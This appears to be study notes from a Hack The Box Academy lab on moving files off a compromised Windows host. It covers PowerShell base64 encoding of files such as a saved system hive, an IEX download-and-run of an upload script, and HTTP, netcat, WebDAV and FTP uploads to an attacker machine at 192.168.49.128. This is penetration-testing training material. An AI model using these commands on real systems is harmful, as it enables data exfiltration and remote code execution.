![](https://academy.hackthebox.com/storage/modules/24/WIN-download-PwnBox.png)

==PowerShell Base64 Encode & Decode==
```powershell-session
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "system.save" -Encoding byte))


PS C:\htb> Get-FileHash "users.db" -Algorithm MD5 | select Hash
```

```shell-session
Orbixio@htb[/htb]$ echo <base64 goes here> | base64 -d > hosts

Orbixio@htb[/htb]$ md5sum hosts 
```

==PowerShell Web Uploads==

```shell-session
Orbixio@htb[/htb]$ python3 -m uploadserver
```

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file.

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('<url hosting PSUpload.ps1>')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

==PowerShell Base64 Web Upload==

```shell-session
Orbixio@htb[/htb]$ nc -lvnp 8000
```

```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

==SMB Uploads (WebDAV)==

```shell-session
Orbixio@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

```cmd-session
C:\htb> dir \\192.168.49.128\DavWWWRoot
```

**Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

==FTP Uploads==

```shell-session
Orbixio@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
```

```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

#### Create a Command File for the FTP Client to Upload a File

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

